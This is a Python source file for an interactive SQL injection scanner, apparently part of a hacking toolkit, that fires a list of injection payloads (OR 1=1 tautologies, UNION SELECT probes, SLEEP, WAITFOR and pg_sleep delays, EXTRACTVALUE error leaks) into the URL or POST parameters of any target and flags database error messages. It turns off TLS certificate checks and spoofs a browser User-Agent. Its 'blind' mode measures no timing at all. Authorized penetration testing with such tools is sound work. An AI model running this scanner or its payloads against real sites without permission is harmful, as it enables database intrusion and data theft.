"""SQL Injection Scanner — Automated SQLi vulnerability detection."""

import os
import sys
import time
import urllib.request
import urllib.parse
import urllib.error
import ssl

try:
    from kevbin import clear, cprint, prompt, pause
except ImportError:
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    def cprint(*a, **kw):
        msg = ' '.join(str(x) for x in a if isinstance(x, str))
        sys.stdout.write(msg + '\n'); sys.stdout.flush()
    def prompt(msg=''):
        if msg: sys.stdout.write(msg); sys.stdout.flush()
        return input()
    def pause():
        prompt('\n  \033[90mPress Enter to continue...\033[0m'); input()

PAYLOADS = ["'", "\"", "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "1' AND SLEEP(3)--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL,NULL--", "admin'--",
    "' AND BENCHMARK(5000000,SHA1('test'))--", "'; WAITFOR DELAY '0:0:3'--",
    "' OR pg_sleep(3)--", "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"]

ERRORS = ["you have an error in your sql syntax", "warning: mysql", "unclosed quotation",
    "microsoft ole db provider", "ora-01756", "postgresql", "sqlite3.operationalerror",
    "mysql_fetch", "pg_query", "valid mysql result", "mssql_query", "syntax error",
    "sqlite_error", "unterminated quoted", "quoted string not properly"]

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

def _fetch(url, timeout=10):
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 Chrome/120.0.0.0'})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
            return r.read().decode('utf-8', errors='ignore'), r.status
    except urllib.error.HTTPError as e:
        return (e.read().decode('utf-8', errors='ignore') if e.fp else ''), e.code
    except Exception as e:
        return str(e), 0

def _check(body):
    low = body.lower()
    for e in ERRORS:
        if e in low:
            return True, e
    return False, ""

def _get_params(url):
    p = urllib.parse.urlparse(url)
    return list(urllib.parse.parse_qs(p.query).keys()), urllib.parse.parse_qs(p.query), p

def run(kevbin=None):
    while True:
        clear()
        cprint("  \033[93m\u2554" + "\u2550"*44 + "\u2557")
        cprint("  \033[93m\u2551       SQL INJECTION SCANNER                \u2551")
        cprint("  \033[93m\u255a" + "\u2550"*44 + "\u255d")
        cprint("  \033[91m[!] Authorized testing only\033[0m")
        print()
        cprint("  \033[97m[1]  Scan URL Parameters\033[0m")
        cprint("  \033[97m[2]  Scan POST Form\033[0m")
        cprint("  \033[97m[3]  Blind SQLi (time-based)\033[0m")
        cprint("  \033[91m[0]  Back\033[0m")
        print()
        choice = prompt("\033[33m  choice > \033[0m")
        if choice == '0':
            return
        elif choice in ('1', '2', '3'):
            clear()
            url = prompt("\033[33m  URL: \033[0m").strip()
            if not url: continue
            if choice == '2':
                post_data = prompt("\033[33m  POST params (key=val&key2=val2): \033[0m").strip()
                params = dict(urllib.parse.parse_qsl(post_data))
                param_names = list(params.keys())
            elif '?' in url:
                param_names, qs, parsed = _get_params(url)
            else:
                param_names = [prompt("\033[33m  Param name: \033[0m").strip()]
                qs = {param_names[0]: ['']}
                parsed = urllib.parse.urlparse(url)
            if not param_names:
                cprint("  \033[91m[X] No parameters\033[0m"); pause(); continue
            cprint(f"\n  \033[36m[*] Testing {len(param_names)} param(s), {len(PAYLOADS)} payloads...\033[0m\n")
            vulns = []
            total = len(param_names) * len(PAYLOADS)
            done = 0
            for param in param_names:
                for payload in PAYLOADS:
                    done += 1
                    if choice == '1':
                        new_params = dict(qs)
                        new_params[param] = [payload]
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(new_params, doseq=True)}"
                        body, status = _fetch(test_url)
                    elif choice == '2':
                        test_params = dict(params)
                        test_params[param] = payload
                        data = urllib.parse.urlencode(test_params).encode()
                        req = urllib.request.Request(url, data=data, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'})
                        try:
                            with urllib.request.urlopen(req, timeout=10, context=CTX) as r:
                                body = r.read().decode('utf-8', errors='ignore')
                                status = r.status
                        except urllib.error.HTTPError as e:
                            body = e.read().decode('utf-8', errors='ignore') if e.fp else ''
                            status = e.code
                        except Exception as e:
                            body = str(e); status = 0
                    else:
                        test_url = url.replace('=', '=' + payload, 1) if '=' in url else url + payload
                        body, status = _fetch(test_url)
                    pct = int((done / total) * 100)
                    bar_len = 30
                    filled = int(bar_len * done / total)
                    bar = "\033[92m" + "\u2588"*filled + "\033[90m" + "\u2591"*(bar_len-filled) + "\033[0m"
                    sys.stdout.write(f"\r  [{bar}] \033[97m{pct:3d}%\033[0m testing...")
                    sys.stdout.flush()
                    vuln, err = _check(body)
                    if vuln:
                        vulns.append({"param": param, "payload": payload, "evidence": err, "type": "error-based"})
                        sys.stdout.write(f"\r  \033[92m[VULN]\033[0m {param} | {payload[:30]} | {err[:40]}\n")
                        sys.stdout.flush()
                    elif status >= 500:
                        vulns.append({"param": param, "payload": payload, "evidence": f"HTTP {status}", "type": "server-error"})
            clear()
            cprint(f"\n  \033[93m\u2554{'─'*44}\u2557")
            cprint(f"  \033[93m\u2551  RESULTS                                 \u2551")
            cprint(f"  \033[93m\u255a{'─'*44}\u255d\033[0m")
            cprint(f"  \033[97m  Tested: {total} payloads\033[0m")
            if vulns:
                cprint(f"  \033[92m  Found:  {len(vulns)} potential vulnerability(ies)\033[0m\n")
                for v in vulns:
                    cprint(f"  \033[92m  [!]\033[0m \033[96m{v['param']}\033[0m | {v['payload'][:35]}")
                    cprint(f"      \033[90m{v['evidence'][:50]} ({v['type']})\033[0m")
            else:
                cprint(f"  \033[93m  No vulnerabilities detected\033[0m")
        else:
            cprint("  \033[91mInvalid choice\033[0m")
            time.sleep(0.5)
        pause()
